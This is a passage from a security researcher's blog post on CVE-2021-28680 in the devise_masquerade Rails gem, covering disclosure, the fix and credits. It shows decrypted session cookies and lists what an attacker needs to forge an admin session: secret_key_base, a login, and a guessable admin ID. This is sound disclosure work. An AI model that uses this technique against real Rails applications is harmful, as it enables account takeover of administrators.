c0RLTDNOTWQ4alFHNnVrdnZHWFB3SVRhd1I2OXlGTEw1eEkvcnB1bDBLQU0xb2ZxTXlvaFlsSDFXYnE3WFpjWEZtZHFnakFDRVBhaWhEV1VJUFFVbkxtWDhsbDQzZitsc0trOFVaR3BHV0RPdmNwTi9DNHY2SVdONXVpWnBjVUFHOHBEWnlDb0ljRWhMbm5Yemxzd2NXUzV4dFpxOEFEZS82RW9JclowR1kxRHMxN3BEY3dUVTdXU29pelJLSTk3b2s3RDA2N1FGbytuU3phTG0vMU14K2ozVVhTMmNhakNNOWNoM3F6cTl2K3NLcHFHV0dLWENjdGlZZXVNaE1BKytaRVRneHlBNmlBRFN0T1JLa2lqaHplTmFyZnZnQitFVU54UE1WSWpqRDVLOTlvZ1I2VjhDWXpVTGFIRWxyaUR1bFd4c3dHdDZOaTNMaEt2R3hucEltUmZuRUZNbVZEaGdDK3I3bGVRQ3hIVnc3dnVVeXltS2dPbHdWb1BYVDJLOG1aZFptYTh0TnpUS0JQN2pQVGJFZz09LS05eXl1Z3RKcVhlSkorejlrci9nZE13PT0%3D--853704baa288b0af958eb333b97851f82720744e

Existing session: 
{"session_id"=>"7ecd38e081ad62435c47bc1fee51ad5d", "flash"=>{"discard"=>[], "flashes"=>{"notice"=>"Signed in successfully."}}, "warden.user.user.key"=>[[1], "$2a$10$FEcuUA/KECTwvnjHSRY0oO"], "_csrf_token"=>"uB1Jk0WwDmT/bCx1ag4j6qzMPenwlHsFhx1XnQRYwL0="}
```

So "all" you have to obtain to exploit this vulnerability is:

* `secret_key_base`
* the ability to login as a user
* the user ID of a target administrator (which can be brute forced since they
  are sequential)
 
# My Recommendations

The 23<sup>rd</sup> of December 2020 I sent my finding (as an early Christmas
gift) to a `devise_masquerade` maintainer together with a proposed fix
(communicated in writing only -- no coding). I also included the designated
Devise security email address in the conversation, but it later turned out that
nobody was watching that inbox (see the GitHub
[issue](https://github.com/heartcombo/devise/issues/5329)). I asked if they
agreed that it is a security vulnerability (which they did) and if they thought
it warrants a CVE (which they never responded to). I also recommended to create
a [security advisory on
GitHub](https://github.com/oivoodoo/devise_masquerade/security/advisories).

<figure>
  <img src="../../../../images/devise_masquerade_no_security_advisories.png"
style="display:inline" title="No security advisories"
alt="GitHub -> oivoodoo/devise_masquerade -> Security -> Security Advisories:
There aren't and published security advisories">
  <figcaption><i>(No) security advisories for <tt>devise_masquerade</tt> on
GitHub</i></figcaption>
</figure>

Since GitHub is nowadays a CVE Numbering Authority (CNA), they can reserve a
CVE number for you. From GitHub’s documentation page [Requesting a CVE
identification
number](https://docs.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory#requesting-a-cve-identification-number):

> Anyone with admin permissions to a security advisory can request a CVE
> identification number for the security advisory.
>
> If you don't already have a CVE identification number for the security
> vulnerability in your project, you can request a CVE identification number
> from GitHub. GitHub usually reviews the request within 72 hours. Requesting a
> CVE identification number doesn't make your security advisory public. If your
> security advisory is eligible for a CVE, GitHub will reserve a CVE
> identification number for your advisory. We'll then publish the CVE details
> after you publish the security advisory.

Only repository administrators can create security advisories however and the
maintainer has not done so despite me mentioning it in the email conversations
three times... But of course I cannot require anything from an open source
developer without proper backing from a company! So I decided to [try my luck
with Mitre](https://cveform.mitre.org/) instead and they assigned
[CVE-2021-28680](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-28680)
for the vulnerability within seven hours.

<figure>
  <img src="../../../../images/devise_masquerade_use_cve.png"
style="display:inline" title="Email from Mitre"
alt="Use CVE-2021-28680 - -- CVE Assignment Team">
  <figcaption><i>Email from Mitre</i></figcaption>
</figure>

Here is the solution for the security problem that I recommended to the
maintainer:

> I've thought about a possible mitigation as well. Instead of just storing the
> ID of the admin doing the impersonation so that one can quit the
> impersonation and become the admin again, store the admin's Bcrypt salt as
> well. That way nobody with the knowledge of secret\_key\_base can "reverse
> impersonate" an admin without first knowing the admin's Bcrypt salt. As an
> extra bonus all impersonated sessions will stop being valid when the
> administrator changes their password. Right now, as I understand it, if
> sessions are stored as cookies, impersonated sessions will only become
> invalid when the target user changes their password - not when the
> administrator who made the impersonation changes theirs.
 
# The Fix

The maintainer of `devise_masquerade` chose to remove the "masquerade back"
data from the session cookie and store it in the server’s cache instead. See
[pull request #76](https://github.com/oivoodoo/devise_masquerade/pull/76). The
fix is included in [release
v1.3.1](https://github.com/oivoodoo/devise_masquerade/releases/tag/v1.3.1) (but
the [non-released version
1.3.0](https://github.com/oivoodoo/devise_masquerade/commit/bc0d09d3c04062aeeaaed60d7607df4aa3492002)
also includes it).

Decrypted session cookies from version 1.3.1 (prettified for readability)
follows.

Logged in as user 1:

{{< highlight plain "linenos=false,hl_lines=11" >}}
{
  "session_id" => "4138ca0390666931801f7f444f485365",
  "flash" =>
  {
    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[1], "$2a$10$FEcuUA/KECTwvnjHSRY0oO"],
  "_csrf_token" => "sbtbiqICigXTLHgxW6KmEVlkEEZhjHXLXX1K3UGoIMg="
}
{{< /highlight >}}

User 1 masqueraded as user 2:

{{< highlight plain "linenos=false,hl_lines=2 11 13-14" >}}
{
  "session_id" => "c03d2e8a1bffa57e98130991da15c374",
  "flash" =>
  {
    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[2], "$2a$10$BS3Aqkt5g2bOTM6IOgWzWu"],
  "_csrf_token" => "sbtbiqICigXTLHgxW6KmEVlkEEZhjHXLXX1K3UGoIMg=",
  "devise_masquerade_masquerading_resource_class" => "User",
  "devise_masquerade_masqueraded_resource_class" => "User"
}
{{< /highlight >}}

Masqueraded back to user 1:

{{< highlight plain "linenos=false,hl_lines=2 11" >}}
{
  "session_id" => "dbf7ff8b35bec174c7468608aaeb557d",
  "flash" =>
  {
    "discard" => [],
    "flashes" =>
    {
      "notice" => "Signed in successfully."
    }
  },
  "warden.user.user.key" => [[1], "$2a$10$FEcuUA/KECTwvnjHSRY0oO"],
  "_csrf_token" => "sbtbiqICigXTLHgxW6KmEVlkEEZhjHXLXX1K3UGoIMg="
}
{{< /highlight >}}

That is the story of how I found a security problem in an open source project
and got my first CVE!

Prior to the publication of this blog post I created the public [GitHub issue
#83](https://github.com/oivoodoo/devise_masquerade/issues/83)</a> for
traceability.

# Comments?

Do you have questions, comments or corrections? Please interact with the
[tweet](https://twitter.com/LabanSkoller/status/1374461045633257482) or
[LinkedIn
post](https://www.linkedin.com/posts/labanskoller_the-devise-extension-that-peeled-off-one-activity-6780228700697849856-Tqfq)
or [make a pull
request](https://github.com/labanskoller/labanskoller.se/edit/main/content/blog/2021-03-23-devise_masquerade.md).

# Credit

Thanks to:
* Devise maintainer [Carlos Antonio da
  Silva](https://github.com/carlosantoniodasilva) for reading my report and
  giving valuable feedback and fix proposals
* `devise_masquerade` maintainer [Alexandr
  Korsak](https://github.com/oivoodoo/) for fixing the issue
* My Defensify colleague [Jinny
  Ramsmark](https://www.linkedin.com/in/jinnyramsmark/) for reviewing this blog
  post
* Onion photo <a
  href="https://www.dreamstime.com/royalty-free-stock-image-peeling-onion-image27402026">27402026</a>
  © <a href="https://www.dreamstime.com/leeavison_info"
  itemprop="author">Leerodney Avison</a> - <a
  href="https://www.dreamstime.com/">Dreamstime.com</a>
